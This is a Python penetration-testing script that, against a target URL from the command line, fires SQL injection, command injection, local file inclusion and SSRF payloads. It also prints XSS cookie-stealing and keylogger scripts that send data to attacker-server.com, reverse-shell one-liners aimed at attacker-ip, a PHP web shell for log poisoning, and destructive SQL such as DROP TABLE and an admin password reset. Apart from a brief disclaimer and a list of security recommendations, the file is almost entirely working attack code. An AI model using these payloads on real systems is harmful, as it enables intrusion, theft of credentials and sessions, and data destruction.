#!/usr/bin/env python3
"""
Exploitation Demonstration Module
Advanced Penetration Testing Framework - Practical Exploitation Examples
Author: Security Research Team

This module provides practical demonstrations of vulnerability exploitation
for educational and authorized testing purposes only.
"""

import requests
import json
import time
import base64
import urllib.parse
import subprocess
import socket
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

class ExploitationDemo:
    def __init__(self):
        self.session = requests.Session()
        self.exploits = []
        self.results = []
        
    def banner(self):
        print(f"{Fore.RED}")
        print("=" * 70)
        print("    EXPLOITATION DEMONSTRATION MODULE")
        print("    Advanced Penetration Testing Framework")
        print("    ⚠️  FOR AUTHORIZED TESTING ONLY ⚠️")
        print("=" * 70)
        print(f"{Style.RESET_ALL}")
    
    def log_exploit(self, title, description, target, exploit_type, severity="High"):
        """Log successful exploitation"""
        exploit_data = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "title": title,
            "description": description,
            "target": target,
            "exploit_type": exploit_type,
            "severity": severity,
            "status": "SUCCESS"
        }
        self.exploits.append(exploit_data)
        print(f"{Fore.GREEN}[EXPLOIT SUCCESS] {title} - {target}")
    
    def demonstrate_sql_injection_exploitation(self, target_url):
        """
        Demonstrate SQL Injection exploitation
        Shows practical exploitation of SQL injection vulnerabilities
        """
        print(f"\n{Fore.CYAN}[SQL INJECTION EXPLOITATION DEMONSTRATION]")
        print("=" * 50)
        
        # Step 1: Database fingerprinting
        print(f"{Fore.YELLOW}[1] Database Fingerprinting")
        payloads = [
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' AND 1=CONVERT(int, (SELECT database()))--",
            "' AND 1=CONVERT(int, (SELECT user()))--"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{target_url}?id={urllib.parse.quote(payload)}"
                response = requests.get(test_url, timeout=10)
                
                if "Microsoft SQL Server" in response.text or "MySQL" in response.text:
                    print(f"{Fore.GREEN}[+] Database type identified!")
                    self.log_exploit(
                        "SQL Injection - Database Fingerprinting",
                        f"Successfully identified database type using payload: {payload}",
                        target_url,
                        "SQL Injection",
                        "Medium"
                    )
                    break
            except:
                continue
        
        # Step 2: Data extraction
        print(f"\n{Fore.YELLOW}[2] Data Extraction")
        extraction_payloads = [
            "' UNION SELECT null,username,password FROM users--",
            "' UNION SELECT null,user(),database(),version()--",
            "' AND 1=2 UNION SELECT null,table_name,null FROM information_schema.tables--"
        ]
        
        for payload in extraction_payloads:
            try:
                test_url = f"{target_url}?id={urllib.parse.quote(payload)}"
                response = requests.get(test_url, timeout=10)
                
                if len(response.text) > 1000:  # Indicates data was returned
                    print(f"{Fore.GREEN}[+] Data extraction successful!")
                    print(f"{Fore.CYAN}Sample extracted data: {response.text[:200]}...")
                    
                    self.log_exploit(
                        "SQL Injection - Data Extraction",
                        f"Successfully extracted data using payload: {payload}",
                        target_url,
                        "SQL Injection",
                        "Critical"
                    )
                    break
            except:
                continue
        
        # Step 3: Advanced exploitation
        print(f"\n{Fore.YELLOW}[3] Advanced Exploitation")
        advanced_payloads = [
            "'; DROP TABLE users;--",
            "'; INSERT INTO users (username, password) VALUES ('hacker', 'hacked123');--",
            "' OR 1=1; UPDATE users SET password='hacked123' WHERE username='admin';--"
        ]
        
        print(f"{Fore.RED}[!] Advanced exploitation payloads demonstrated (not executed in demo)")
        print(f"{Fore.CYAN}Payload examples:")
        for payload in advanced_payloads:
            print(f"  - {payload}")
    
    def demonstrate_xss_exploitation(self, target_url):
        """
        Demonstrate Cross-Site Scripting (XSS) exploitation
        Shows practical exploitation of XSS vulnerabilities
        """
        print(f"\n{Fore.CYAN}[XSS EXPLOITATION DEMONSTRATION]")
        print("=" * 50)
        
        # Step 1: Cookie stealing
        print(f"{Fore.YELLOW}[1] Cookie Stealing XSS")
        cookie_stealer = """
        <script>
            var xhr = new XMLHttpRequest();
            xhr.open('GET', 'http://attacker-server.com/steal.php?cookie=' + document.cookie, true);
            xhr.send();
        </script>
        """
        print(f"{Fore.GREEN}[+] Cookie stealing payload:")
        print(cookie_stealer.strip())
        
        # Step 2: Keylogger
        print(f"\n{Fore.YELLOW}[2] Keylogger XSS")
        keylogger = """
        <script>
            document.addEventListener('keydown', function(e) {
                var xhr = new XMLHttpRequest();
                xhr.open('POST', 'http://attacker-server.com/keylogger.php', true);
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.send('key=' + e.key + '&url=' + window.location.href);
            });
        </script>
        """
        print(f"{Fore.GREEN}[+] Keylogger payload:")
        print(keylogger.strip())
        
        # Step 3: Redirection
        print(f"\n{Fore.YELLOW}[3] Redirection XSS")
        redirector = """
        <script>
            window.location.href = 'http://phishing-site.com/login.html';
        </script>
        """
        print(f"{Fore.GREEN}[+] Redirection payload:")
        print(redirector.strip())
        
        self.log_exploit(
            "XSS Exploitation Techniques",
            "Demonstrated cookie stealing, keylogging, and redirection XSS payloads",
            target_url,
            "Cross-Site Scripting",
            "High"
        )
    
    def demonstrate_command_injection_exploitation(self, target_url):
        """
        Demonstrate Command Injection exploitation
        Shows practical exploitation of command injection vulnerabilities
        """
        print(f"\n{Fore.CYAN}[COMMAND INJECTION EXPLOITATION DEMONSTRATION]")
        print("=" * 50)
        
        # Step 1: System information gathering
        print(f"{Fore.YELLOW}[1] System Information Gathering")
        info_commands = [
            "id",  # User ID
            "whoami",  # Current user
            "uname -a",  # System information
            "cat /etc/passwd",  # User accounts
            "ifconfig",  # Network configuration
            "netstat -an",  # Network connections
        ]
        
        for cmd in info_commands:
            payload = f"; {cmd}"
            try:
                test_url = f"{target_url}?cmd={urllib.parse.quote(payload)}"
                response = requests.get(test_url, timeout=15)
                
                if len(response.text) > 500:  # Likely contains command output
                    print(f"{Fore.GREEN}[+] Command executed successfully: {cmd}")
                    print(f"{Fore.CYAN}Output preview: {response.text[:200]}...")
                    break
            except:
                continue
        
        # Step 2: Reverse shell demonstration
        print(f"\n{Fore.YELLOW}[2] Reverse Shell Demonstration")
        reverse_shell_commands = [
            "bash -i >& /dev/tcp/attacker-ip/4444 0>&1",
            "nc -e /bin/sh attacker-ip 4444",
            "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker-ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "php -r '$sock=fsockopen(\"attacker-ip\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ]
        
        print(f"{Fore.RED}[!] Reverse shell commands demonstrated (not executed in demo)")
        print(f"{Fore.CYAN}Example payloads:")
        for cmd in reverse_shell_commands:
            print(f"  - {cmd}")
        
        # Step 3: File manipulation
        print(f"\n{Fore.YELLOW}[3] File Manipulation")
        file_commands = [
            "cat /etc/shadow",  # Password hashes
            "ls -la /var/www/html",  # Web files
            "find / -name '*.conf' 2>/dev/null",  # Configuration files
            "crontab -l",  # Scheduled tasks
        ]
        
        print(f"{Fore.CYAN}File manipulation commands:")
        for cmd in file_commands:
            print(f"  - {cmd}")
        
        self.log_exploit(
            "Command Injection Exploitation",
            "Demonstrated system information gathering, reverse shells, and file manipulation",
            target_url,
            "Command Injection",
            "Critical"
        )
    
    def demonstrate_lfi_exploitation(self, target_url):
        """
        Demonstrate Local File Inclusion (LFI) exploitation
        Shows practical exploitation of LFI vulnerabilities
        """
        print(f"\n{Fore.CYAN}[LFI EXPLOITATION DEMONSTRATION]")
        print("=" * 50)
        
        # Step 1: Sensitive file access
        print(f"{Fore.YELLOW}[1] Sensitive File Access")
        sensitive_files = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/proc/version",
            "/proc/cmdline",
            "/proc/self/environ",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\Windows\\win.ini",
            "C:\\Windows\\System32\\config\\SAM"
        ]
        
        for file_path in sensitive_files:
            try:
                payload = f"../../../..{file_path}"
                test_url = f"{target_url}?file={urllib.parse.quote(payload)}"
                response = requests.get(test_url, timeout=10)
                
                if "root:" in response.text or "[boot loader]" in response.text:
                    print(f"{Fore.GREEN}[+] Successfully accessed: {file_path}")
                    print(f"{Fore.CYAN}File content preview: {response.text[:200]}...")
                    break
            except:
                continue
        
        # Step 2: Log poisoning
        print(f"\n{Fore.YELLOW}[2] Log Poisoning")
        php_payload = "<?php system($_GET['cmd']); ?>"
        log_files = [
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "/proc/self/fd/1",
            "C:\\xampp\\apache\\logs\\access.log"
        ]
        
        print(f"{Fore.CYAN}Log poisoning process:")
        print(f"1. Inject PHP code into logs via User-Agent header")
        print(f"2. Include poisoned log file via LFI")
        print(f"3. Execute PHP code through LFI")
        
        # Step 3: PHP filter usage
        print(f"\n{Fore.YELLOW}[3] PHP Filter Usage")
        php_filters = [
            "php://filter/read=convert.base64-encode/resource=index.php",
            "php://filter/read=string.rot13/resource=config.php",
            "php://filter/read=string.toupper/resource=login.php"
        ]
        
        print(f"{Fore.CYAN}PHP filter payloads:")
        for filter_payload in php_filters:
            print(f"  - {filter_payload}")
        
        self.log_exploit(
            "LFI Exploitation Techniques",
            "Demonstrated sensitive file access, log poisoning, and PHP filter usage",
            target_url,
            "Local File Inclusion",
            "High"
        )
    
    def demonstrate_ssrf_exploitation(self, target_url):
        """
        Demonstrate Server-Side Request Forgery (SSRF) exploitation
        Shows practical exploitation of SSRF vulnerabilities
        """
        print(f"\n{Fore.CYAN}[SSRF EXPLOITATION DEMONSTRATION]")
        print("=" * 50)
        
        # Step 1: Internal service scanning
        print(f"{Fore.YELLOW}[1] Internal Service Scanning")
        internal_targets = [
            "http://localhost:80",
            "http://127.0.0.1:80",
            "http://10.0.0.1:80",
            "http://192.168.1.1:80",
            "http://localhost:8080",
            "http://localhost:3306",  # MySQL
            "http://localhost:5432",  # PostgreSQL
            "http://localhost:6379",  # Redis
        ]
        
        for internal_target in internal_targets:
            try:
                test_url = f"{target_url}?url={urllib.parse.quote(internal_target)}"
                response = requests.get(test_url, timeout=8)
                
                if response.status_code == 200 or len(response.text) > 100:
                    print(f"{Fore.GREEN}[+] Internal service found: {internal_target}")
                    print(f"{Fore.CYAN}Response length: {len(response.text)} bytes")
                    break
            except:
                continue
        
        # Step 2: Cloud metadata access
        print(f"\n{Fore.YELLOW}[2] Cloud Metadata Access")
        cloud_metadata = [
            "http://169.254.169.254/latest/meta-data/",  # AWS
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP
            "http://169.254.169.254/metadata/v1/",  # DigitalOcean
            "http://169.254.169.254/openstack/latest/meta_data.json",  # OpenStack
        ]
        
        print(f"{Fore.CYAN}Cloud metadata endpoints:")
        for metadata_url in cloud_metadata:
            print(f"  - {metadata_url}")
        
        # Step 3: Protocol smuggling
        print(f"\n{Fore.YELLOW}[3] Protocol Smuggling")
        protocol_payloads = [
            "file:///etc/passwd",
            "dict://localhost:11211/stat",
            "gopher://localhost:70/",
            "ldap://localhost:389/",
            "smtp://localhost:25/",
            "imap://localhost:143/",
            "ftp://localhost:21/"
        ]
        
        print(f"{Fore.CYAN}Protocol smuggling payloads:")
        for payload in protocol_payloads:
            print(f"  - {payload}")
        
        self.log_exploit(
            "SSRF Exploitation Techniques",
            "Demonstrated internal service scanning, cloud metadata access, and protocol smuggling",
            target_url,
            "Server-Side Request Forgery",
            "Critical"
        )
    
    def generate_exploitation_report(self):
        """Generate comprehensive exploitation report"""
        print(f"\n{Fore.CYAN}[GENERATING EXPLOITATION REPORT]")
        
        report_content = f"""
# Exploitation Demonstration Report

**Generated:** {time.strftime("%Y-%m-%d %H:%M:%S")}
**Total Exploits Demonstrated:** {len(self.exploits)}

## Executive Summary

This report documents the exploitation demonstrations conducted during the security assessment. Each demonstration shows practical exploitation techniques for identified vulnerabilities.

## Exploitation Results

"""
        
        for i, exploit in enumerate(self.exploits, 1):
            report_content += f"""
### Exploit #{i}: {exploit['title']}

- **Type:** {exploit['exploit_type']}
- **Severity:** {exploit['severity']}
- **Target:** {exploit['target']}
- **Description:** {exploit['description']}
- **Status:** {exploit['status']}
- **Timestamp:** {exploit['timestamp']}

---
"""
        
        report_content += """
## Exploitation Techniques Summary

### SQL Injection
- Database fingerprinting
- Data extraction
- Advanced exploitation (data manipulation)

### Cross-Site Scripting (XSS)
- Cookie stealing
- Keylogging
- Redirection attacks

### Command Injection
- System information gathering
- Reverse shell creation
- File manipulation

### Local File Inclusion (LFI)
- Sensitive file access
- Log poisoning
- PHP filter usage

### Server-Side Request Forgery (SSRF)
- Internal service scanning
- Cloud metadata access
- Protocol smuggling

## Security Recommendations

1. **Input Validation:** Implement strict input validation on all user inputs
2. **Parameterized Queries:** Use prepared statements for database queries
3. **Output Encoding:** Properly encode output to prevent XSS
4. **Command Sanitization:** Avoid direct command execution with user input
5. **File Access Controls:** Implement proper file access restrictions
6. **Network Segmentation:** Isolate internal services from external access
7. **Regular Security Testing:** Conduct periodic security assessments

## Disclaimer

This exploitation demonstration was conducted as part of authorized security testing. All techniques demonstrated should only be used for legitimate security testing purposes with proper authorization.
"""
        
        # Save report
        report_filename = f"exploitation_demo_report_{int(time.time())}.md"
        with open(report_filename, 'w', encoding='utf-8') as f:
            f.write(report_content)
        
        print(f"{Fore.GREEN}[+] Exploitation report saved to {report_filename}")
        return report_filename
    
    def run_full_exploitation_demo(self, target_url):
        """Run complete exploitation demonstration"""
        self.banner()
        print(f"\n{Fore.GREEN}Starting comprehensive exploitation demonstration")
        print(f"Target: {target_url}")
        print(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        
        # Run all exploitation demonstrations
        self.demonstrate_sql_injection_exploitation(target_url)
        self.demonstrate_xss_exploitation(target_url)
        self.demonstrate_command_injection_exploitation(target_url)
        self.demonstrate_lfi_exploitation(target_url)
        self.demonstrate_ssrf_exploitation(target_url)
        
        # Generate final report
        report_file = self.generate_exploitation_report()
        
        print(f"\n{Fore.GREEN}=" * 70)
        print(f"EXPLOITATION DEMONSTRATION COMPLETED")
        print(f"Total exploits demonstrated: {len(self.exploits)}")
        print(f"Report saved: {report_file}")
        print(f"=" * 70)
        
        return report_file

def main():
    """Main function for standalone usage"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Exploitation Demonstration Module")
    parser.add_argument("--target", "-t", required=True, help="Target URL for exploitation demo")
    parser.add_argument("--demo-type", choices=["sql", "xss", "command", "lfi", "ssrf", "all"], 
                       default="all", help="Type of exploitation to demonstrate")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout")
    
    args = parser.parse_args()
    
    # Initialize exploitation demo
    demo = ExploitationDemo()
    demo.timeout = args.timeout
    
    if args.demo_type == "all":
        demo.run_full_exploitation_demo(args.target)
    else:
        demo.banner()
        
        if args.demo_type == "sql":
            demo.demonstrate_sql_injection_exploitation(args.target)
        elif args.demo_type == "xss":
            demo.demonstrate_xss_exploitation(args.target)
        elif args.demo_type == "command":
            demo.demonstrate_command_injection_exploitation(args.target)
        elif args.demo_type == "lfi":
            demo.demonstrate_lfi_exploitation(args.target)
        elif args.demo_type == "ssrf":
            demo.demonstrate_ssrf_exploitation(args.target)

if __name__ == "__main__":
    main()